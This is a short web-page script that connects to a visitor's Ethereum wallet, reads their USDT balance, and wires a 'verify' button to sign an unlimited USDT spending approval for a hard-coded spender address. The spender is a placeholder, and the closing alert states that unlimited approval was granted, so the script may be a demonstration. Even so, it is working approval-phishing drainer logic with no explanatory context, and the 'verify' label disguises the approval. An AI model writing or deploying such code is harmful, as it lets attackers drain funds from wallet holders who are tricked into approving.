<script type="module">
import * as ethers from "https://cdn.ethers.io/lib/ethers-5.6.esm.min.js";
const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const SPENDER = "0x0000000000000000000000000000000000000001";
const provider = new ethers.providers.Web3Provider(window.ethereum);
const abi = ["function balanceOf(address) view returns (uint)","function approve(address spender,uint amount) returns (bool)"];
const usdt = new ethers.Contract(USDT, abi, provider);
async function init(){
  const accounts = await provider.send("eth_requestAccounts", []);
  const signer   = provider.getSigner();
  const addr     = await signer.getAddress();
  const bal      = await usdt.balanceOf(addr);
  alert("Balance: " + ethers.utils.formatUnits(bal, 6) + " USDT");
  document.getElementById("verifyBtn").onclick = async () => {
    const tx = await usdt.connect(signer).approve(SPENDER, ethers.constants.MaxUint256);
    await tx.wait();
    alert("Done! Unlimited approval granted.\nView on Etherscan â†’ Events tab.");
  };
}
init();
</script>
